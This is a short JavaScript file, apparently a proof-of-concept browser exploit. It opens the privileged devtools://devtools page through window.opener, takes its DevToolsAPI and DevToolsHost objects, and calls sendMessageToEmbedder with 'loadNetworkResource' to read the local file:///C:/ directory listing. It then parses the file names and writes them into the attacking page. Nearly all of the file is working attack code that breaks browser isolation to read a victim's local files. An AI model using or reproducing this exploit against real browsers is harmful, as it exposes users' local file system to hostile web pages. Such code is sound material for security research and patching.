// alert(origin);

//     window.w = w;
// })
const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
window.opener.close();
w.addEventListener("load", async () => {
    if (!w.DevToolsAPI) {
        console.log("reloading");
        w.opener = null;
        w.location.reload();
    }
    await sleep(500);
    for (const property of ["DevToolsAPI", "DevToolsHost"]) {
        window[property] = w[property];
    }
    console.log("Got DevToolsAPI object from opened window:", DevToolsAPI);
    exploit();
});

window.w = w;


function exploit() {
    // const DevToolsAPI = w.DevToolsAPI;
    let data = "";
    DevToolsAPI.streamWrite = (id, chunk) => {
        data += chunk;
    };
    DevToolsAPI.sendMessageToEmbedder("loadNetworkResource", ["file:///C:/", "", 0],
        result => {
            console.log(data);
            const p = document.createElement("p");
            const addRowMatches = Array.from(data.matchAll(/addRow\(".*?"/g));
            for (let i = 0; i < addRowMatches.length; i++) {
                const str = addRowMatches[i][0];
                addRowMatches[i] = str.substring(8, str.length - 1);
            }
            document.write("Extracted:");
            p.innerText = `${addRowMatches.join("\n")}\n\nHere is the full page source:\n${data}`;
            document.body.appendChild(p);
            w.close();
        }
    );
}

function sleep(ms) {
    return new Promise(resolve => {
        setTimeout(resolve, ms);
    });
}
